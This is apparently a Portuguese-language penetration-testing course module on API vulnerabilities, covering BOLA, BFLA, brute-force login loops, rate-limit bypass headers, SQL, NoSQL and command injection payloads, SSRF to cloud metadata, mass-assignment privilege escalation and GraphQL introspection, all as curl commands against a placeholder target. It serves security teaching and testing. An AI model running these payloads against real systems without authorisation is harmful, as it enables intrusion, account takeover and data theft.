# Teste de Vulnerabilidades em APIs

> BOLA, BFLA, injeção, rate limiting e outras falhas comuns em APIs.

---

## 📚 O que são Vulnerabilidades em APIs?

**APIs** são frequentemente o ponto de entrada mais vulnerável de uma aplicação. **BOLA** (Broken Object Level Authorization) é a vulnerabilidade #1 — permite acessar dados de outros usuários apenas alterando IDs na requisição.

### Por que isso é importante?

- APIs expõem **dados sensiveis** (usuários, pedidos, pagamentos)
- **BOLA** afeta 94% das APIs testadas (OWASP API Security Top 10)
- Falta de **rate limiting** permite brute force e abuso
- APIs antigas e não documentadas podem estar **acessíveis sem autenticação**

### Como funciona na prática?

```
GET /api/users/1    → Retorna dados do usuário 1 ✅
GET /api/users/2    → Retorna dados do usuário 2 ← BOLA! ❌
GET /api/admin/users → Acesso admin sem auth ← BFLA! ❌
```

### Ferramentas

| Ferramenta | O que faz |
|:---|:---|
| **Kiterunner** | Enumeração e fuzzing de APIs |
| **Arjun** | Descobrir parâmetros ocultos |
| **Nuclei** | Scan de vulnerabilidades com templates |
| **Burp Suite** | Interceptação e manipulação de requests |

---

## Instalação das Ferramentas

```bash
# Kiterunner
go install github.com/assetnote/kiterunner@latest

# Arjun
pip3 install arjun

# nuclei (com templates de API)
nuclei -update-templates
```

---

## OWASP API Security Top 10 (2023)

| # | Vulnerabilidade | Descrição |
|---|-----------------|-----------|
| 1 | **BOLA** | Broken Object Level Authorization |
| 2 | **BFLA** | Broken Function Level Authorization |
| 3 | **Broken Authentication** | Autenticação fraca |
| 4 | **Unrestricted Resource Consumption** | Sem rate limiting |
| 5 | **Broken Function Level Authorization** | Acesso não autorizado |
| 6 | **Unrestricted Access to Sensitive Business Flows** | Fluxos sensíveis |
| 7 | **Server Side Request Forgery (SSRF)** | SSRF via API |
| 8 | **Security Misconfiguration** | Configurações erradas |
| 9 | **Improper Inventory Management** | APIs antigas expostas |
| 10 | **Unsafe Consumption of APIs** | Consumo inseguro |

---

## BOLA (Broken Object Level Authorization)

A vulnerabilidade #1 em APIs. Acontece quando você pode acessar recursos de outros usuários alterando IDs.

### Como testar
```bash
# 1. Identificar endpoints com IDs
curl http://target.com/api/users/1
curl http://target.com/api/users/2
curl http://target.com/api/users/3

# 2. Verificar se retorna dados de outros usuários
# Se o usuário 1 retornar dados do usuário 2 = BOLA

# 3. Testar com diferentes IDs
for i in $(seq 1 100); do
  curl -s http://target.com/api/users/$i | jq '.email' 2>/dev/null
done

# 4. Testar com UUIDs
curl http://target.com/api/users/550e8400-e29b-41d4-a716-446655440000
```

### Exemplo real
```bash
# Comprimento normal
curl http://target.com/api/orders/123

# Alterar para outro ID
curl http://target.com/api/orders/124

# Se retornar pedido de outro usuário = BOLA
```

---

## BFLA (Broken Function Level Authorization)

Acesso a funções que você não deveria ter.

### Como testar
```bash
# 1. Testar endpoints de admin
curl http://target.com/api/admin/users
curl http://target.com/api/internal/config
curl http://target.com/api/debug/health

# 2. Testar métodos diferentes
curl -X DELETE http://target.com/api/users/1
curl -X PUT http://target.com/api/users/1
curl -X PATCH http://target.com/api/users/1/role

# 3. Verificar se usuários comuns podem acessar
# Se um user normal acessar /admin = BFLA
```

---

## Broken Authentication

### Como testar
```bash
# 1. Testar brute force
for i in $(seq 1 1000); do
  curl -s -X POST http://target.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"pass'$i'"}' | jq '.token' 2>/dev/null
done

# 2. Testar token inválido
curl -H "Authorization: Bearer invalid_token" http://target.com/api/users

# 3. Testar token expirado
curl -H "Authorization: Bearer expired_token" http://target.com/api/users

# 4. Verificar se retorna 401
# Se retornar 200 = vulnerability
```

---

## Rate Limiting

### Como testar
```bash
# 1. Enviar muitas requisições
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://target.com/api/login \
    -d '{"username":"admin","password":"test"}'
done

# 2. Verificar se bloqueia após X tentativas
# Se não bloquear = vulnerability

# 3. Testar bypass
curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/login
curl -H "X-Originating-IP: 1.2.3.4" http://target.com/api/login
```

---

## Injeção em APIs

### SQL Injection
```bash
# Em parâmetros de query
curl "http://target.com/api/users?search=admin' OR 1=1--"

# Em body JSON
curl -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query": "admin'\'' OR 1=1--"}'
```

### NoSQL Injection
```bash
# MongoDB injection
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Se retornar dados = NoSQL injection
```

### Command Injection
```bash
# Em parâmetros
curl "http://target.com/api/ping?host=127.0.0.1;id"

# Em body
curl -X POST http://target.com/api/ping \
  -d '{"host": "127.0.0.1;id"}'
```

---

## SSRF via APIs

```bash
# 1. Identificar endpoints que fazem requests
curl -X POST http://target.com/api/fetch \
  -d '{"url": "http://127.0.0.1:8080"}'

# 2. Acessar serviços internos
curl -X POST http://target.com/api/fetch \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# 3. Listar ports internos
for port in 80 443 8080 3306 5432 6379; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://target.com/api/fetch \
    -d "{\"url\": \"http://127.0.0.1:$port\"}"
done
```

---

## Nuclei para APIs

```bash
# Scan de vulnerabilidades de API
nuclei -u http://target.com/api/ -t http/vulnerabilities/

# Templates específicos de API
nuclei -u http://target.com -tags api

# Scan de endpoints descobertos
cat endpoints.txt | nuclei -tags api -severity critical,high
```

---

### Resumo da ordem — Por que essa sequência?

Teste de API segue: **autenticar → enumerar endpoints → testar controles → explorar**.

```
PASSO 1: Analisar autenticação → Entender como protege
├── POR QUE: Se auth fraca, qualquer outro teste é mais fácil
├── O QUE FAZER: Testar sem token, token inválido, token de outro user
├── COMANDO: curl http://target.com/api/users (sem header)
├── QUANDO AVANÇAR: Quando entender o mecanismo de auth
└── SE DER ERRADO: Se retornar 401, tente bypass com JWT manipulation

        ↓

PASSO 2: Enumerar endpoints → Listar tudo que existe
├── POR QUE: Endpoints não documentados podem ter bugs
├── FERRAMENTAS: Kiterunner, Arjun, ffuf
├── QUANDO AVANÇAR: Quando tiver lista completa de endpoints
└── DICAS: Teste todos os métodos (GET, POST, PUT, DELETE, PATCH)

        ↓

PASSO 3: Testar BOLA → Acessar dados de outros usuários
├── POR QUE: BOLA é a vulnerabilidade #1 em APIs
├── O QUE FAZER: Alterar IDs em endpoints que retornam dados
├── COMANDO: curl http://target.com/api/users/2 (sendo user 1)
├── QUANDO AVANÇAR: Se retornar dados de outro user = BOLA
└── DICAS: Teste UUIDs, IDs negativos, 0, null

        ↓

PASSO 4: Testar BFLA → Acessar funções de administrador
├── POR QUE: Funcionalidades admin podem estar acessíveis
├── O QUE FAZER: Chamar endpoints de admin com user normal
├── COMANDO: curl -X DELETE http://target.com/api/users/1
├── QUANDO AVANÇAR: Se retornar 200 = BFLA encontrado
└── SE DER ERRADO: Se bloquear, teste com header X-Admin: true

        ↓

PASSO 5: Rate Limiting → Verificar se bloqueia abuso
├── POR QUE: Sem rate limit, brute force é trivial
├── O QUE FAZER: Enviar 100+ requests rápidas
├── QUANDO PARAR: Quando tiver resposta de todos os testes
└── SE DER ERRADO: Se não bloquear = vulnerabilidade
```

---

## Lab Prático

### Exercício 1: BOLA Challenge
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/owasptop10
- **O que vai praticar:** BOLA, acesso a recursos de outros usuários
- **Tempo estimado:** 30 min

### Exercício 2: API Hacking
- **Plataforma:** PortSwigger
- **Link:** https://portswigger.net/web-security/all-labs
- **O que vai praticar:** SQL injection via API, authentication bypass
- **Tempo estimado:** 60 min

### Dica de Estudo
> BOLA é a vulnerabilidade mais comum em APIs. Sempre teste alterando IDs em endpoints que retornam dados.

---

## Tool Card: Mass Assignment

**O que é:** Vulnerabilidade onde a API aceita campos extras no body JSON — permite modificar campos que o usuário não deveria (ex: `role: admin`, `isVerified: true`).

### Como testar

```bash
# 1. Fazer POST normal para criar usuário
curl -X POST http://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "João", "email": "joao@test.com"}'

# OUTPUT ESPERADO:
# {"id": 42, "name": "João", "email": "joao@test.com", "role": "user"}

# 2. Inserir campo extra: role = admin
curl -X POST http://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "Attacker", "email": "attacker@evil.com", "role": "admin"}'

# Se retornar 201 com role "admin" = Mass Assignment!

# 3. Testar outros campos sensíveis
curl -X PUT http://target.com/api/users/42 \
  -H "Content-Type: application/json" \
  -d '{"name": "João", "isVerified": true, "credits": 99999}'

# Se aceitar = Mass Assignment

# 4. Enumerar campos possíveis
# - role, isAdmin, isVerified, credits, balance
# - email_verified, account_type, permissions
```

### Exemplo real: élevação de privilégio

```bash
# Criar conta normal
curl -X POST http://target.com/api/register \
  -d '{"user": "attacker", "pass": "senha123"}'

# Atualizar para admin
curl -X PUT http://target.com/api/users/attacker \
  -H "Authorization: Bearer <token>" \
  -d '{"user": "attacker", "role": "admin"}'

# Se aceitar = você agora é admin!
```

---

## Tool Card: GraphQL Introspection

**O que é:** GraphQL expõe todo o schema via query de introspecção — permite descobrir todos os tipos, queries, mutations e campos.

### Query de Introspecção

```bash
# Query GraphQL completa de introspecção
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name kind } } } } } }"}'

# OUTPUT ESPERADO:
# {
#   "data": {
#     "__schema": {
#       "queryType": { "name": "Query" },
#       "mutationType": { "name": "Mutation" },
#       "types": [
#         { "name": "User", "kind": "OBJECT", "fields": [
#           { "name": "id", "type": { "name": "ID" } },
#           { "name": "email", "type": { "name": "String" } },
#           { "name": "password", "type": { "name": "String" } },
#           { "name": "role", "type": { "name": "String" } }
#         ]},
#         ...
#       ]
#     }
#   }
# }
```

### Introspecção parcial (quando completo é bloqueado)

```bash
# Tentar tipos específicos
curl -X POST http://target.com/graphql \
  -d '{"query": "{ __type(name: \"User\") { name fields { name type { name } } } }"}'

# Listar queries disponíveis
curl -X POST http://target.com/graphql \
  -d '{"query": "{ __schema { queryType { fields { name } } } }"}'

# Listar mutations
curl -X POST http://target.com/graphql \
  -d '{"query": "{ __schema { mutationType { fields { name } } } }"}'
```

### Explorar campos sensíveis

```bash
# Após introspecção, buscar dados
curl -X POST http://target.com/graphql \
  -d '{"query": "{ users { id email password role } }"}'

# Se retornar passwords = vulnerabilidade grave!

# Buscar dados de outros usuários
curl -X POST http://target.com/graphql \
  -d '{"query": "{ user(id: 1) { email password } }"}'

# Mutation para alterar dados
curl -X POST http://target.com/graphql \
  -d '{"query": "mutation { updateUser(id: 1, role: \"admin\") { id role } }"}'
```

---

**Anterior:** [01-reconhecimento-e-documentacao.md](01-reconhecimento-e-documentacao.md)
**Próximo:** [Módulo 12: Database Security](../12-database-security/)
